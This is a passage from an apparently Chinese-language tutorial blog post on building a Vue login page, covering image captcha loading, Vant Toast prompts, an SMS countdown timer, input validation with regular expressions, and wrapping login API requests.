class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>调试返回如下</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281850640.png" alt="image-20240828185016590"></p><h4 id="解析-base64-并完善点击刷新图片验证码"><a class="markdownIt-Anchor" href="#解析-base64-并完善点击刷新图片验证码"></a> 解析 base64 并完善点击刷新图片验证码</h4><p>由于提交的图形验证码必须带 key 才能让后端进行唯一校验，所以在 data 中提供：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">picCode:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">''</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 用户输入的图形验证码</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">picKey:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">''</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 图形验证码的key</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">picUrl:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">''</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 存放要渲染的图形验证码的url</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">},</span></span></code></pre></div></div></figure><p>接着进行响应结果的解构，存储好数据以便后续提交后端进行校验</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getPicCode</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #C8C8C8">methods</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">   </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getPicCode</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">     </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">: { </span><span style="color: #4FC1FF">base64</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">Key</span><span style="color: #D4D4D4"> } } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/captcha/image'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">     </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">base64</span></span><span class="line"><span style="color: #D4D4D4">     </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picKey</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Key</span></span><span class="line"><span style="color: #D4D4D4">   }</span></span><span class="line"><span style="color: #D4D4D4"> }</span></span></code></pre></div></div></figure><p>完善 template 相关代码：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"form-item"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">   &lt;input v-model="picCode" class="inp" maxlength="5" placeholder="请输入图形验证码" type="text"&gt;</span></span><span class="line"><span style="color: #D4D4D4">   &lt;img v-if="picUrl" :src="picUrl" @click="getPicCode" alt=""&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>封装登录请求到 api 包下，新建 login.js</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 登录相关接口请求</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getPicCode</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/captcha/image"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>使用时按需导入。于是到登录页 index.js 中改 <code>import request from '@/utils/request'</code> 为 <code>import { getPicCode } from '@/api/login'</code> 并修改调用语句：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">methods</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getPicCode</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">: { </span><span style="color: #4FC1FF">base64</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">Key</span><span style="color: #D4D4D4"> } } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getPicCode</span><span style="color: #D4D4D4">()</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">base64</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picKey</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Key</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>上述语句不会因为重名冲突，我们需要知道的是，如果是引入的 getPicCode 前面是不带 this 的，而自身的 getPicCode 是需要在前面加上 this. 的</p><h3 id="toast-轻提示"><a class="markdownIt-Anchor" href="#toast-轻提示"></a> Toast 轻提示</h3><p>校验手机号是否输入、是否输入格式正确等并给予提示。</p><p>使用 vant 库中的 Toast 轻提示，完成提示显示。需要注意的是他的两种调用方式：</p><ol><li>Toast (' 提示内容 ');</li><li>this.<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;提&quot; used in math mode [unicodeTextInMathMode] at position 8: toast('提̲示文案');  引入 Toas…">toast (' 提示文案 ');  引入 Toast 组件后，会自动在 Vue 的 prototype 上挂载 `</span>toast` 方法，便于在组件内调用。</li></ol><p>这两种调用，第一种是任意地方都可以调用显示出提示内容，第二种是只有组件内才可以显示提示内容。Toast 默认采用单例模式，即同一时间只会存在一个 Toast，如果需要在同一时间弹出多个 Toast，可以参考下面的示例：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">allowMultiple</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">toast1</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"第一个 Toast"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">toast2</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">success</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"第二个 Toast"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">toast1</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">clear</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">toast2</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">clear</span><span style="color: #D4D4D4">();</span></span></code></pre></div></div></figure><h3 id="短信验证倒计时"><a class="markdownIt-Anchor" href="#短信验证倒计时"></a> 短信验证倒计时</h3><p>点击获取验证码之后要开始倒计时，一分钟只能发送一次。给获取短信验证码的按钮注册点击事件并改写显示文字</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"form-item"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">   &lt;input class="inp" placeholder="请输入短信验证码" type="text"&gt;</span></span><span class="line"><span style="color: #D4D4D4">   &lt;button @click="getCode"&gt;{{ totalTime === timeNow ? '获取验证码' : `${timeNow}秒后重试` }}&lt;/button&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>提供短信验证码获取函数 getCode</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 短信验证码获取</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCode</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 只有当计时器处于未开启状态并且当前时间和总时间一致时说明可以开启倒计时</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timerId</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timeNow</span><span style="color: #D4D4D4"> === </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">totalTime</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 开启计时器</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timerId</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">setInterval</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timeNow</span><span style="color: #D4D4D4">--</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timeNow</span><span style="color: #D4D4D4"> &lt;= </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 停止计时器</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #DCDCAA">clearInterval</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timerId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timerId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">null</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timeNow</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">totalTime</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      }, </span><span style="color: #B5CEA8">1000</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 获取成功给予提示</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'获取短信验证码成功'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><p>并考虑到性能问题，于是增加在用户离开登录页面之后清除定时器的功能，实现在 destroy 生命函数</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">destroyed</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 当用户退出登录页面清除定时器</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">clearInterval</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">timerId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><h3 id="手机号和图形验证码类型校验"><a class="markdownIt-Anchor" href="#手机号和图形验证码类型校验"></a> 手机号和图形验证码类型校验</h3><p>由于前端无法校验具体，只能校验数据类型和长度。所以新增两个正则数据和绑定用户输入的手机号：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 手机号正则 1开头 3-9为第二位 接着9位数字</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">reg_phone</span><span style="color: #D4D4D4">:</span><span style="color: #D16969"> /</span><span style="color: #DCDCAA">^</span><span style="color: #D16969">1</span><span style="color: #CE9178">[</span><span style="color: #D16969">3-9</span><span style="color: #CE9178">]</span><span style="color: #D16969">\d</span><span style="color: #D7BA7D">{9}</span><span style="color: #DCDCAA">$</span><span style="color: #D16969">/</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">reg_picCode</span><span style="color: #D4D4D4">:</span><span style="color: #D16969"> /</span><span style="color: #DCDCAA">^</span><span style="color: #D16969">\w</span><span style="color: #D7BA7D">{4}</span><span style="color: #DCDCAA">$</span><span style="color: #D16969">/</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 图形正则</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">phoneNum</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">''</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 用户输入的手机号码</span></span></code></pre></div></div></figure><p>增加校验的函数 validFn</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 校验手机号和图形验证码</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">validFn</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">reg_phone</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phoneNum</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'请输入正确的手机号！'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">reg_picCode</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picCode</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'图形验证码错误！'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span></code></pre></div></div></figure><p>并在短信验证码获取函数 getCode 中加入一行判断</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 短信验证码获取</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">getCode</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 校验手机号和图形验证码格式</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">validFn</span><span style="color: #D4D4D4">()) { </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> }</span></span><span class="line"><span style="color: #D4D4D4">      ...</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><h3 id="封装发送短信验证码请求"><a class="markdownIt-Anchor" href="#封装发送短信验证码请求"></a> 封装发送短信验证码请求</h3><p>转到 login.js 中进行封装（结合接口文档）</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getMsgCode</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">captchaCode</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">captchaKey</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">mobile</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/captcha/sendSmsCaptcha"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">form:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">captchaCode</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">captchaKey</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">mobile</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>然后在短信验证码获取函数 getCode 中加入调用代码</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 短信验证码获取</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCode</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 发送获取短信验证码的请求</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getMsgCode</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picCode</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">picKey</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phoneNum</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(res)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'短信发送成功，请注意查收'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      ...</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><h3 id="实现登录功能-封装登录接口"><a class="markdownIt-Anchor" href="#实现登录功能-封装登录接口"></a> 实现登录功能 - 封装登录接口</h3><p>封装登录请求</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">codeLogin</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">mobile</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">smsCode</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/passport/login"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">form:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">isParty:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">mobile</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">partyData:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">smsCode</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>绑定登录按钮事件为 login，绑定用户输入的短信验证码为 smsCode（默认短信为 246810）</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 登录功能</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">login</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 校验手机号和图形验证码格式</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">validFn</span><span style="color: #D4D4D4">()) { </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 校验输入的短信验证码格式</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #D16969">/</span><span style="color: #DCDCAA">^</span><span style="color: #D16969">\d</span><span style="color: #D7BA7D">{6}</span><span style="color: #DCDCAA">$</span><span style="color: #D16969">/</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">smsCode</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: 